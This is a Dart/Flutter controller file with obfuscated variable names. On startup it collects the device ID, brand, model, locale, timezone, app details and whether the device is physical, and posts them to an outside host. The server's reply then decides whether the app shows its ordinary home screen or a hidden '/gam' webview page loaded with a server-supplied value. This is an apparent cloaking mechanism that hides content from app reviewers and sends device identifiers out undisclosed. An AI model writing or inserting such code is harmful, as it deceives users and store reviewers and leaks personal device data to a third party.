import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var feroyn = RxBool(false);
  var rwjkdn = RxBool(true);
  var anbgld = RxString("");
  var dejuan = RxBool(false);
  var balistreri = RxBool(true);
  final deihjvnkx = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    gncy();
  }


  Future<void> gncy() async {

    dejuan.value = true;
    balistreri.value = true;
    rwjkdn.value = false;

    deihjvnkx.post("https://miao.meiether.info/SrrrJmrlnq4",data: await vltpnofx()).then((value) {
      var qcios = value.data["qcios"] as String;
      var wmecuin = value.data["wmecuin"] as bool;
      if (wmecuin) {
        anbgld.value = qcios;
        carolyn();
      } else {
        kuhlman();
      }
    }).catchError((e) {
      rwjkdn.value = true;
      balistreri.value = true;
      dejuan.value = false;
    });
  }

  Future<Map<String, dynamic>> vltpnofx() async {
    final DeviceInfoPlugin qbupjlsy = DeviceInfoPlugin();
    PackageInfo dnyp_fonw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var lodmw = Platform.localeName;
    var ntjhcO = currentTimeZone;

    var qEWvgJer = dnyp_fonw.packageName;
    var ElWzD = dnyp_fonw.version;
    var utyzd = dnyp_fonw.buildNumber;

    var YBrL = dnyp_fonw.appName;
    var BqEyH = "";
    var uyYQ = "";
    var JLaphe  = "";
    var kimSchmeler = "";
    var emmieBlock = "";
    var wilhelmineCollins = "";


    var erlMItLT = "";
    var GqIApdR = false;

    if (GetPlatform.isAndroid) {
      erlMItLT = "android";
      var erhvoctgy = await qbupjlsy.androidInfo;

      BqEyH = erhvoctgy.brand;

      uyYQ  = erhvoctgy.model;
      JLaphe = erhvoctgy.id;

      GqIApdR = erhvoctgy.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      erlMItLT = "ios";
      var xufoiave = await qbupjlsy.iosInfo;
      BqEyH = xufoiave.name;
      uyYQ = xufoiave.model;

      JLaphe = xufoiave.identifierForVendor ?? "";
      GqIApdR  = xufoiave.isPhysicalDevice;
    }
    var res = {
      "YBrL": YBrL,
      "utyzd": utyzd,
      "JLaphe": JLaphe,
      "emmieBlock" : emmieBlock,
      "qEWvgJer": qEWvgJer,
      "uyYQ": uyYQ,
      "ntjhcO": ntjhcO,
      "BqEyH": BqEyH,
      "lodmw": lodmw,
      "ElWzD": ElWzD,
      "erlMItLT": erlMItLT,
      "GqIApdR": GqIApdR,
      "wilhelmineCollins" : wilhelmineCollins,
      "kimSchmeler" : kimSchmeler,

    };
    return res;
  }

  Future<void> kuhlman() async {
    Get.offAllNamed("/home");
  }

  Future<void> carolyn() async {
    Get.offAllNamed("/gam");
  }

}
